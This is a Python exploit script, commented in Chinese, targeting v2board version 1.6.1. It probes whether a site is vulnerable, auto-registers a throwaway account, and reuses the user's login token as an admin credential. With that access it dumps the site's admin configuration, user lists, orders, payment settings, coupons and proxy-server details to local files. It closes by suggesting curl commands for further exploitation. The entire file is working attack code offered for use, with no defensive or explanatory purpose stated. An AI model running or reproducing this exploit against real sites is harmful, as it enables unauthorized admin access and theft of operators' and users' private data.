import requests
import random
import os
import sys
from urllib.parse import urlparse
from pprint import pprint
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

headers = {
    'authorization': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.7113.93 Safari/537.36',
}

def POC():
    """
    检测目标v2board是否为v1.6.1漏洞版本
    """
    path = '/api/v1/admin/config/fetch'
    url = f"{target}{path}".replace('//api','/api')
    r = s.get(url,headers=headers,verify=False)
    if r.status_code == 403 and '\\u9274\\u6743\\u5931\\u8d25'  in r.text:
        print(f"[+]{target}存在漏洞！")
    else:
        print(f"[-]{target}不存在漏洞！")
        exit(0)


def check_verify():
    """
    判断目标注册是否需要邮箱、邀请验证
    """
    path = '/api/v1/guest/comm/config'
    url = f"{target}{path}".replace('//api','/api')
    resp = s.get(url,headers=headers).json()['data']
    if not resp['is_invite_force'] and not resp['is_email_verify']:
        print(f"[+]目标无需邮箱验证，可直接获取权限")
    elif resp['is_invite_force']:
        print(f"[-]目标需要邀请注册，无法获取权限!")
        exit(0)
    elif resp['is_email_verify']:
        print("目标需要获取邮箱验证码才能进一步利用！")
        exit(0)
      
      
def registry_acc():
    """
    随机注册账号,并返回auth_data
    """
    rand_num = str(random.random())[8:]
    QQ_mail = rand_num + '@qq.com'
    passwd = rand_num
    
    data = {
        'email': QQ_mail,
        'password': passwd,
        'invite_code': '',
        'email_code': ''
    }
    path = '/api/v1/passport/auth/register'
    url = f"{target}{path}".replace('//api','/api')
      
    r = s.post(url,headers=headers,data=data)
    if r.status_code == 200:
        print(f"[+]当前随机注册的账号为{QQ_mail},密码为{passwd}")
        return QQ_mail,passwd
    else:
        print(f"[-]目标已关闭账号注册！")
        exit(0)
  
def login(email,passwd):
    """
    登录后需要请求/user/getStat接口才能使authorization生效
    """
    data = {
        'email': email,
        'password': passwd
    }
    path = '/api/v1/passport/auth/login'
    url = f"{target}{path}".replace('//api','/api')
    r = s.post(url, headers=headers, data=data)
    if r.status_code == 200:
        print('[+]账号登录成功！')
        auth_data = r.json()['data']['auth_data']
        headers['authorization'] = auth_data
        s.get(f'{target}/api/v1/user/getStat', headers=headers)
        s.get(f'{target}/api/v1/user/info', headers=headers)
        return auth_data
    else:
        print('[-]账号登录失败！')
        exit(0)
    

def create_dir(dir):
    if not os.path.exists(dir):
        os.mkdir(dir)
    os.chdir(dir)
  

def EXP(auth_data):
    """
    获取管理员部分接口敏感数据
    """
    path = '/api/v1/admin/config/fetch'
    url = f"{target}{path}".replace('//api','/api')
    
    path_list = ['/config/fetch','/plan/fetch','/server/group/fetch','/server/trojan/fetch',
                 '/server/v2ray/fetch','/server/shadowsocks/fetch','/order/fetch','/user/fetch',
                 '/coupon/fetch','/payment/fetch']
    
    headers['authorization'] = auth_data
    r = s.get(url,headers=headers)
    if r.status_code == 200:
        print("[+]获取管理员权限成功!")
        create_dir(domian)
        for path in path_list:
            path = '/api/v1/admin' + path
            url = f"{target}{path}".replace('//api','/api')
            r = s.get(url,headers=headers)
            if r.status_code == 200:
                print(f"[+]{path}接口数据dump成功！")
                with open(path.replace('/','_')+'.json','w')as f:
                    f.write(r.text) 
            else:
                print(f"[-]{path}接口数据dump失败！")

        print("更多路由接口参考：https://github.com/v2board/v2board/blob/master/app/Http/Routes/AdminRoute.php")
        print(f"可使用curl命令进一步利用:\ncurl '{target}/[route]' -H 'authorization: {auth_data}''")
            
    else:
        print("[-]获取管理员权限失败！")


if __name__ == "__main__":
    target = sys.argv[1]
    if not target.startswith("http"):
        target = f'https://{target}'
    s = requests.session()
    domian = urlparse(target).netloc
    POC()
    check_verify()
    auth_data = login(*registry_acc())
    EXP(auth_data)